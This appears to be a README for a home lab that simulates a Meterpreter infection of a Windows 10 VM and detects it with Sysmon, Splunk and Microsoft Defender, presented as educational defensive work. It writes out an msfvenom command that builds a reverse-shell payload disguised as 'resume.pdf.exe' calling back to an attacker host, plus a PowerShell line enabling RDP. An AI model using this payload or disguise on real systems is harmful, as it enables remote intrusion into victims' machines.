🛡️ Malware Detection Lab with Splunk, Sysmon & MSFvenom
📌 Overview
This project demonstrates a simulated malware infection and detection lab in a controlled virtual environment using:

🪟 Windows 10 (victim machine)

🐧 Kali Linux (attacker machine)

🛠️ MSFvenom to generate a malicious payload

📦 Splunk Enterprise for centralized log analysis

🔍 Sysmon to monitor system activity

💥 Microsoft Defender for malware detection

The goal was to simulate a real-world endpoint compromise, detect malicious behavior using logs, and visualize this activity in Splunk. This lab showcases not only technical skills, but also problem-solving, resilience, and curiosity through challenges like offline app installation, RDP configuration, and log troubleshooting.

⚙️ Lab Setup
Component	Details
Victim Machine	Windows 10 (VirtualBox)
Attacker Machine	Kali Linux
SIEM	Splunk Enterprise
Log Agent	Sysmon + Sysmon TA for Splunk
Network	Internal NAT (no internet in VM)

🧪 Attack Scenario
Payload Creation: Used msfvenom to create a malicious reverse shell:

bash
Kopieren
Bearbeiten
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o resume.pdf.exe
Payload Delivery: Served the payload using Python HTTP server and downloaded it in the Windows 10 VM.

Execution: Ran the disguised file resume.pdf.exe, which triggered Defender alerts.

Defensive Monitoring:

Enabled RDP using PowerShell to inspect system remotely.

Enabled Sysmon logging with a custom sysmonconfig.xml.

Configured Splunk Enterprise to collect logs locally using:

TA-Sysmon Add-on

Data input for Microsoft-Windows-Sysmon/Operational

Searched for indicators like:

index=endpoint source="Microsoft-Windows-Sysmon/Operational"

Detection of Trojan:Win64/Meterpreter.AMTB by Defender.

🧠 What I Learned
How to simulate real-world endpoint compromise scenarios safely.

How to extract detailed process and parent process data using Sysmon.

How to configure Splunk for offline environments using Guest Additions and shared folders.

How to enable and access RDP using PowerShell:

powershell
Kopieren
Bearbeiten
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Patience and problem-solving: from zip file visibility issues to missing Sysmon logs — all were solved with research and persistence.

📸 Screenshots
Sysmon capturing process creation

Splunk showing Defender detection of resume.pdf.exe

Splunk TA-Sysmon installation

Custom queries to detect suspicious activity

All screenshots can be found in the /screenshots folder.

🤝 Acknowledgements
🧠 ChatGPT – helped me troubleshoot every step of the way.

📺 YouTube tutorials from cybersecurity instructors.

🧪 My own trial, error, curiosity and late-night frustration.

🔒 Disclaimer
This lab was conducted in a safe, offline, virtual environment. Do not deploy these techniques on live systems or networks. This is for educational purposes only.